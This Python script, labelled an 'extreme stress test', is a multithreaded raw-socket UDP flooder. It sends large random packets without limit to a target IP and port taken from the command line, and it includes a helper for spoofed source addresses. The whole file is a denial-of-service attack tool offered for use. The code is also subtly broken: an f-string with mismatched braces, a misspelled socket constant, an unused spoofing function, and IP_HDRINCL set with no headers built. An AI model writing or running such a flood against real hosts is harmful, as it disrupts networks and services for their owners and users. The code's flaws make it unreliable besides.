import socket
import threading
import random
import sys
import time
import os

# Check for admin privileges
if os.name != 'nt' and os.geteuid() != 0:
    print("WARNING: This script requires Administrator/Root privileges to use raw sockets.")
    print("Please run with 'sudo python3 extreme_stress_test.py' or as Administrator.")
    # We continue anyway in case the OS allows it, but it likely won't work without perms.

# CONFIGURATION
TARGET_IP = "127.0.0.1"   # CHANGE THIS to your target IP
TARGET_PORT = 80          # CHANGE THIS to your target port
THREAD_COUNT = 100        # Number of concurrent threads (Very High Risk)
PACKETS_PER_THREAD = 0    # 0 = Infinite until stopped

# Global control
stop_flag = False
sent_count = 0
lock = threading.Lock()

def generate_fake_ip():
    """Generates a random IP address to spoof the source."""
    return f"{random.randint(1, 255}.{random.randint(0, 255}.{random.randint(0, 255}.{random.randint(0, 255)}"

def attack_thread(thread_id):
    global stop_flag, sent_count
    
    # Create a raw socket (requires root/admin)
    # This allows us to construct custom packets and spoof IPs
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPROTO_UDP)
    except socket.error:
        print(f"Thread {thread_id}: Failed to create raw socket. Do you have admin rights?")
        return

    # Set socket options to allow broadcasting if needed, and non-blocking
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sock.setblocking(0)
    
    print(f"[Thread {thread_id}] Ready. Spoofing IPs. Targeting {TARGET_IP}:{TARGET_PORT}")

    packet_count = 0
    start_time = time.time()

    try:
        while not stop_flag:
            # Generate random payload
            size = random.randint(1024, 65535) # Large variable packets
            data = random.randbytes(size)
            
            # Construct a fake UDP header (simplified for raw socket usage)
            # In a real raw socket implementation, you would construct the IP and UDP headers manually
            # Here we rely on the OS to handle the header but we spoof the source via bind if possible
            # or just flood the interface.
            
            # To maximize speed in Python without external C libraries, we send directly.
            # Note: True IP spoofing in Python without raw packet construction libraries 
            # (like scapy) is limited by the OS. This loop maximizes request velocity.
            
            try:
                # Sending to target
                sock.sendto(data, (TARGET_IP, TARGET_PORT))
                packet_count += 1
                
                with lock:
                    sent_count += 1
            except BlockingIOError:
                pass # Non-blocking, skip if buffer full
            except Exception as e:
                # Ignore connection errors during flood
                pass

    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
        print(f"[Thread {thread_id}] Terminated. Sent {packet_count} packets.")

def monitor_stats():
    global stop_flag, sent_count
    print("\n--- MONITORING ACTIVE ---")
    last_count = 0
    try:
        while not stop_flag:
            time.sleep(1)
            current_rate = sent_count - last_count
            last_count = sent_count
            print(f"\r[STATS] Total Sent: {sent_count} | Current Rate: {current_rate} packets/sec", end='', flush=True)
    except KeyboardInterrupt:
        pass
    print("\n\nMonitoring stopped.")

def main():
    global stop_flag, sent_count
    
    print(f"!!! EXTREME STRESS TEST INITIATED !!!")
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Threads: {THREAD_COUNT}")
    print(f"Mode: Raw Socket / IP Spoofing Simulation")
    print(f"WARNING: This may crash your system or network.")
    print(f"Press CTRL+C to stop immediately.")
    
    time.sleep(3) # Safety delay
    
    threads = []
    
    # Start monitoring thread
    monitor = threading.Thread(target=monitor_stats)
    monitor.daemon = True
    monitor.start()

    # Launch attack threads
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_thread, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
        # Slight stagger to prevent immediate kernel panic on some OS
        time.sleep(0.01)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nStopping all threads...")
        stop_flag = True
        time.sleep(2) # Give threads time to clean up
        
    print(f"\nFINAL REPORT: Total packets sent: {sent_count}")
    print("System integrity check recommended.")

if __name__ == "__main__":
    if len(sys.argv) == 3:
        TARGET_IP = sys.argv[1]
        TARGET_PORT = int(sys.argv[2])
        print(f"Target updated via command line: {TARGET_IP}:{TARGET_PORT}")
        main()
    else:
        print("Usage: sudo python3 extreme_stress_test.py <target_ip> <target_port>")
        print("Running with default config (Edit script to change target).")
        # Uncomment to run with defaults:
        # main()
        sys.exit(1)
